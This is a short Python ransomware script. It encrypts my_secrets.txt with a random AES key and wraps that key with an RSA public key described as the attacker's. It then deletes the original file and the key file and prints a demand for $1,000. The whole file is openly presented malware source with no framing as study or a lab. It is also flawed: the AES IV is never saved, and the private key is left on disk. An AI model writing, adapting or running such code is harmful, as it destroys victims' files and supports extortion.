import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
import os

# generate a random 16-byte key and save it to key.txt
subprocess.run(["openssl", "rand", "-base64", "16", "-out", "key.txt"])

# generate public/private key pair
subprocess.run(["openssl", "genpkey", "-algorithm", "RSA", "-out", "private.pem"])
subprocess.run(["openssl", "rsa", "-pubout", "-in", "private.pem", "-out", "public.pem"])

# encrypt my_secrets.txt using the symmetric key
with open("key.txt", "rb") as key_file:
    key = base64.b64decode(key_file.read())  # symmetric key

with open("my_secrets.txt", "rb") as secret_file:
    secret_data = secret_file.read()

cipher = AES.new(key, AES.MODE_CBC)
ciphertext = cipher.encrypt(pad(secret_data, AES.block_size))

with open("data_cipher.txt", "wb") as cipher_file:
    cipher_file.write(base64.b64encode(ciphertext))

# encrypt the symmetric key using the attacker's public key
with open("public.pem", "rb") as pub_file:
    public_key = RSA.import_key(pub_file.read())

cipher_rsa = PKCS1_OAEP.new(public_key)
with open("key.txt", "rb") as key_file:
    symmetric_key = key_file.read()

encrypted_key = cipher_rsa.encrypt(base64.b64decode(symmetric_key))
with open("key_cipher.txt", "wb") as encrypted_key_file:
    encrypted_key_file.write(base64.b64encode(encrypted_key))

# delete key.txt and my_secrets.txt
os.remove("key.txt")
os.remove("my_secrets.txt")

# display ransom message
print("Your file my_secrets.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")
